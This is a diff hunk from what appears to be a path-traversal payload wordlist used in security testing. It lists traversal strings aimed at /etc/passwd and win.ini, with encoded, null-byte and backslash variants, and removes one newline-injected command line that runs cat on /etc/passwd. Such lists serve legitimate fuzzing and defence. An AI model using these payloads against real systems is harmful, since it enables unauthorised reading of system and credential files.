@@ -28,7 +28,6 @@
 ..\..\..\..\..\..\..\..\..\..\etc\passwd
 .\\./.\\./.\\./.\\./.\\./.\\./windows/win.ini
 .\\./.\\./.\\./.\\./.\\./.\\./etc/passwd
-%0a/bin/cat%20/etc/passwd
 %00/windows/win.ini
 %00/etc/passwd%00
 %00../../../../../../windows/win.ini
